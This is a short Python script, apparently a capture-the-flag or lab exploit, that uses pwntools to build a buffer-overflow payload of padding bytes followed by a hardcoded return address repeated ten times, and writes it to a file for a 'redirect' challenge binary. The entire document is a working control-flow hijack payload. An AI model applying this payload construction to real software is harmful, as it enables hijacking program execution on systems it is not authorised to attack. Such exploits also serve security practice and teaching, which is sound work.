from pwn import *

payload = b"a"*10+p64(0x4011c4)*10

with open("/home/bomdia/work/bufferoverlflow/redirect-chall/redirectpayload.bin", "wb") as file:
    file.write(payload)